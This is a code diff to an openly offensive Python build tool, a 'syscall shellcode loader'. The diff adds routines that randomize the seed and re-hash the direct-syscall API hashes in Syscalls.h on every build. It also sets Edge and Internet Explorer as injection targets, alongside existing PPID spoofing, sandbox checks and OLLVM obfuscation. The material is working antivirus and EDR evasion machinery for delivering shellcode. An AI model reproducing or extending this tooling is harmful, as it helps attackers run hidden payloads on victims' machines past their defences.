@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #Created by Matthew David (@icyguider)
-import sys, os, argparse, random, string, pefile
+import sys, os, argparse, random, string, re, struct, pefile
 import os.path
 import urllib.request
 
@@ -1311,6 +1311,61 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 }
 """
 
+# Thanks to @S4ntiagoP and @Snovvcrash for the API hashing code
+def get_old_seed():
+    with open('Syscalls.h') as f:
+        code = f.read()
+    match = re.search(r'#define SW2_SEED (0x[a-fA-F0-9]{8})', code)
+    assert match is not None, 'SW2_SEED not found!'
+    return match.group(1)
+
+def replace_seed(old_seed, new_seed):
+    with open('Syscalls.h') as f:
+        code = f.read()
+    code = code.replace(
+        f'#define SW2_SEED {old_seed}',
+        f'#define SW2_SEED 0x{new_seed:08X}',
+        1
+    )
+    with open('Syscalls.h', 'w') as f:
+        f.write(code)
+
+def get_function_hash(seed, function_name):
+    function_hash = seed
+    if function_name[:2] == 'Nt':
+        function_name = 'Zw' + function_name[2:]
+    name = function_name + '\0'
+    ror8 = lambda v: ((v >> 8) & (2 ** 32 - 1)) | ((v << 24) & (2 ** 32 - 1))
+
+    for segment in [s for s in [name[i:i + 2] for i in range(len(name))] if len(s) == 2]:
+        partial_name_short = struct.unpack('<H', segment.encode())[0]
+        function_hash ^= partial_name_short + ror8(function_hash)
+
+    return function_hash
+
+def replace_syscall_hashes(seed):
+    with open('Syscalls.h') as f:
+        code = f.read()
+    regex = re.compile(r'#define (Nt[^(]+) ')
+    syscall_names = re.findall(regex, code)
+    syscall_names = set(syscall_names)
+    syscall_definitions = code.split('EXTERN_C DWORD SW2_GetSyscallNumber')[2]
+
+    for syscall_name in syscall_names:
+        regex = re.compile('#define ' + syscall_name + '.*?mov ecx, (0x0[A-Fa-f0-9]{8})', re.DOTALL)
+        match = re.search(regex, syscall_definitions)
+        assert match is not None, f'hash of syscall {syscall_name} not found!'
+        old_hash = match.group(1)
+        new_hash = get_function_hash(seed, syscall_name)
+        #print(f'{syscall_name} -> {old_hash} -> 0x0{new_hash:08X}')
+        code = code.replace(
+            old_hash,
+            f'0x0{new_hash:08X}'
+        )
+
+    with open('Syscalls.h', 'w') as f:
+        f.write(code)
+
 def generateKey(length):
     letters = string.ascii_letters + string.digits
     key = ''.join(random.choice(letters) for i in range(length))
@@ -1320,6 +1375,7 @@ def generateRandomSyscall(length):
     letters = string.ascii_letters
     syscall = ''.join(random.choice(letters) for i in range(length))
     return syscall
+
 
 def main(stub, infile, outfile, key, process, method, no_randomize, verbose, sandbox, get_syscallstub, no_sandbox, obfuscator_LLVM, word_encode, dll, sandbox_arg, no_ppid_spoof, dll_proxy):
     print("[+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER")
@@ -1453,6 +1509,12 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_ME_SYSCALL_INCLUDE", '#include <winternl.h>\n#include "Syscalls2.h"')
         stub = stub.replace("REPLACE_GetSyscallStubP1", "")
         stub = stub.replace("REPLACE_ME_GetSyscallStubP2", "")
+        print("[+] Re-hashing API syscalls")
+        new_seed = random.randint(2 ** 28, 2 ** 32 - 1)
+        #new_seed = 0x1337C0DE
+        old_seed = get_old_seed()
+        replace_seed(old_seed, new_seed)
+        replace_syscall_hashes(new_seed)
 
     if no_ppid_spoof == True:
         print("[+] PPID Spoofing has been disabled")
@@ -1549,6 +1611,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
             # Feel free to modify the OLLVM flags to fit your needs.
             if dll == True and dll_proxy != None:
                 os.system("x86_64-w64-mingw32-clang++ stub.cpp stub.def -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+                os.system("rm stub.def")
             elif dll == True and dll_proxy == None:
                 os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
             else:
@@ -1616,6 +1679,10 @@ try:
         sys.exit()
     if args.llvm_obfuscator == True:
         args.get_syscallstub = True
+    if args.process == "msedge.exe":
+        args.process = "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
+    elif args.process == "iexplore.exe":
+        args.process = "C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe"
     key = generateKey(49)
     main(stub, args.file, args.out, key, args.process, method, args.no_randomize, args.verbose, sandbox, args.get_syscallstub, args.no_sandbox, args.llvm_obfuscator, args.word_encode, args.dll, args.sandbox_arg, args.no_ppid_spoof, args.dll_proxy)
 except:
